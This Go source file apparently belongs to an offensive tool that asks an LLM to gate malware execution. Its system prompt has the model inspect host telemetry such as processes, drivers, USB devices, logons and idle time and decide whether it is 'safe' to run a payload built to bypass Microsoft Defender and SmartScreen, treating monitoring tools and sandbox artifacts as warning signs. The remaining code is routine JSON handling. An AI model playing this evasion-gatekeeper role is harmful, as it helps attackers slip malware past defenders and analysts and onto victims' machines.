package models

import (
	"encoding/json"
	"regexp"
	"strings"
)

var (
	DefaultAIProvider string
	DefaultAPIKey     string
	DefaultAPIURL     string
	DefaultAIModel    string
)

// ==============================
// Shared AI Types & Helpers
// ==============================

type AIResponse struct {
	Allow    bool    `json:"allow"`
	Conf     float64 `json:"conf"`
	Reason   string  `json:"reason"`
	Thoughts string  `json:"thoughts"`
}

// Standardized OPSEC system prompt (used by all providers)
const SystemPrompt = `
You are an AI OPSEC assistant analyzing telemetry from a host machine.
Your goal is to decide whether it is safe to execute a sensitive payload.

Rules:
- Carefully examine all telemetry fields: processes, drivers, USB, uptime, logons, idle time, active window, working hours and show all metrics.
- Windows Defender and SmartScreen are considered baseline and expected in most environments.
- The payload and execution method are specifically designed to bypass Microsoft Defender and SmartScreen.
- Presence of ONLY Microsoft Defender/SmartScreen is NOT a reason to block execution.
- Consider deviations from baseline, monitoring tools, or sandbox artifacts as unsafe.
- If unsafe, respond with:
  {
    "allow": false,
    "reason": "...",
    "conf": 0.xx,
    "thoughts": "..."
  }
- If safe, respond with:
  {
    "allow": true,
    "reason": "...",
    "conf": 0.xx,
    "thoughts": "..."
  }
- Confidence ("conf") is a float between 0 and 1.
- YOU MUST output ONLY a single JSON object in exactly this format.
- Do not include any explanation, commentary, or extra text outside the JSON object.
`

// TelemetryToJSON converts telemetry struct into a JSON string for prompts
func TelemetryToJSON(t interface{}) string {
	data, _ := json.MarshalIndent(t, "", "  ")
	return string(data)
}

// ExtractJSON pulls the first {...} JSON object from a model response.
// Uses lazy matching to avoid swallowing too much, and includes a fallback.
func ExtractJSON(s string) string {
	// Try lazy match first
	re := regexp.MustCompile(`(?s)\{.*?\}`)
	match := re.FindString(s)
	if match != "" {
		return strings.TrimSpace(match)
	}

	// Fallback: try to recover if the model returned keys without full braces
	if strings.Contains(s, `"allow"`) {
		start := strings.Index(s, "{")
		end := strings.LastIndex(s, "}")
		if start != -1 && end != -1 && start < end {
			return strings.TrimSpace(s[start : end+1])
		}
	}

	return ""
}
